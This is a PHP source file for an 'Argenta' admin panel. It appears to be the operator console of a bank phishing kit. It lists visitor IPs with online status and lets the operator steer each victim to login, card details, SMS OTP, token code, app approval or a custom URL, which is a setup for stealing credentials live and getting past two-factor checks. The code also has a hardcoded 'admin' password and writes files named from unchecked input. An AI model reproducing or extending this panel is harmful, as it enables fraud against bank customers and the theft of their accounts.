<?php
session_start();
include 'config.php';

if (isset($_POST['login'])) {
    if ($_POST['password'] === $bot_token || $_POST['password'] === "admin") {
        $_SESSION['admin_logged'] = true;
    }
}

if (!isset($_SESSION['admin_logged'])) {
    die('<!DOCTYPE html><html><head><title>Admin Login</title><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"></head><body class="bg-light"><div class="container mt-5"><div class="card mx-auto" style="max-width: 400px;"><div class="card-body"><form method="post"><h4>Admin Login</h4><input type="password" name="password" class="form-control mb-3" placeholder="Password" required><button type="submit" name="login" class="btn btn-primary btn-block">Login</button></form></div></div></div></body></html>');
}

if (isset($_POST['action'])) {
    $ip = $_POST['ip'];
    $to = $_POST['to'];
    $error = $_POST['error'] ?? 'off';
    $custom_url = $_POST['custom_url'] ?? '';
    $data = $to . '#|#' . $error;
    if ($to === 'url') $data .= '#|#' . $custom_url;
    if (!file_exists('users')) mkdir('users', 0777, true);
    file_put_contents("users/$ip.txt", $data);
    header("Location: admin.php?msg=Action sent to $ip");
    exit;
}

$visitors = [];
if (is_dir('heartbeat')) {
    $files = scandir('heartbeat');
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..' && strpos($file, '.txt') !== false) {
            $ip = str_replace('.txt', '', $file);
            $last_ping = file_get_contents("heartbeat/$file");
            $status = (time() - $last_ping < 30) ? 'Online' : 'Offline';
            $current_action = file_exists("users/$file") ? file_get_contents("users/$file") : 'None';
            $visitors[] = ['ip' => $ip, 'last_ping' => date('H:i:s', $last_ping), 'status' => $status, 'action' => $current_action];
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>ARGENTA ADMIN PANEL</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
    <meta http-equiv="refresh" content="10">
</head>
<body class="bg-dark text-white">
<div class="container-fluid mt-4">
    <div class="d-flex justify-content-between align-items-center mb-4">
        <h2>🛡️ Argenta Control Panel</h2>
        <span class="badge badge-info">Auto-refresh 10s</span>
    </div>
    <?php if (isset($_GET['msg'])): ?><div class="alert alert-success"><?php echo htmlspecialchars($_GET['msg']); ?></div><?php endif; ?>
    <div class="table-responsive">
        <table class="table table-dark table-hover table-bordered">
            <thead><tr><th>IP Address</th><th>Last Seen</th><th>Status</th><th>Current Command</th><th>Actions</th></tr></thead>
            <tbody>
                <?php foreach ($visitors as $v): ?>
                <tr>
                    <td><?php echo $v['ip']; ?></td>
                    <td><?php echo $v['last_ping']; ?></td>
                    <td><span class="badge badge-<?php echo ($v['status'] === 'Online') ? 'success' : 'secondary'; ?>"><?php echo $v['status']; ?></span></td>
                    <td><code><?php echo htmlspecialchars($v['action']); ?></code></td>
                    <td>
                        <form method="post" class="form-inline">
                            <input type="hidden" name="ip" value="<?php echo $v['ip']; ?>">
                            <select name="to" class="form-control form-control-sm mr-2">
                                <option value="log">Login Page</option>
                                <option value="infos">Card Info</option>
                                <option value="otp">SMS OTP</option>
                                <option value="token">Token Code</option>
                                <option value="app">App Approve</option>
                                <option value="info">Email/Address</option>
                                <option value="done">Success Page</option>
                                <option value="url">Custom URL</option>
                            </select>
                            <select name="error" class="form-control form-control-sm mr-2"><option value="off">No Error</option><option value="on">Show Error</option></select>
                            <input type="text" name="custom_url" class="form-control form-control-sm mr-2" placeholder="URL if Custom" style="width: 100px;">
                            <button type="submit" name="action" class="btn btn-primary btn-sm">Send</button>
                        </form>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>
</body>
</html>
